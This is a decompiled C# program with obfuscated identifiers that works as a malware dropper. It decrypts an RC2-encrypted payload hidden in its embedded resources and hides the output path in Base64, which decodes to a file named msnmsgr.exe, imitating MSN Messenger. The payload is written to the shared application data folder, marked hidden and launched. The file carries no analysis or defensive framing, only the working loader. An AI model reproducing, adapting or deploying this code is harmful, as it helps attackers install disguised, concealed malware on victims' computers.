using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns2;

namespace ns1;

internal sealed class Class15
{
	private static string string_0 = "hKPcZIVuuWerTmSqIiITNfPlVgmitLZhisQLopWd";

	private static Mutex mutex_0;

	[STAThread]
	public static void Main()
	{
		smethod_0(string_0);
		smethod_1();
	}

	public static void smethod_0(string string_1)
	{
		try
		{
			Mutex.OpenExisting(string_1);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			mutex_0 = new Mutex(initiallyOwned: false, string_1);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		ResourceManager resourceManager = new ResourceManager("vEtZUV", Assembly.GetExecutingAssembly());
		string text = ((ServerComputer)Class12.smethod_0()).get_FileSystem().get_SpecialDirectories().get_AllUsersApplicationData() + Encoding.UTF8.GetString(Convert.FromBase64String("XG1zbm1zZ3IuZXhl"));
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		byte[] byte_ = Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject("lNjvKrJuyY")));
		byte[] bytes = smethod_2(byte_, Conversions.ToString(resourceManager.GetObject("NKEWTqMkqmyCQln")));
		File.WriteAllBytes(text, bytes);
		File.SetAttributes(text, FileAttributes.Hidden);
		Process.Start(text);
		ProjectData.EndApp();
	}

	public static byte[] smethod_2(byte[] byte_0, string string_1)
	{
		RC2CryptoServiceProvider rC2CryptoServiceProvider = new RC2CryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array2 = (rC2CryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1)));
		rC2CryptoServiceProvider.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rC2CryptoServiceProvider.CreateDecryptor();
		return cryptoTransform.TransformFinalBlock(byte_0, 0, byte_0.Length);
	}
}
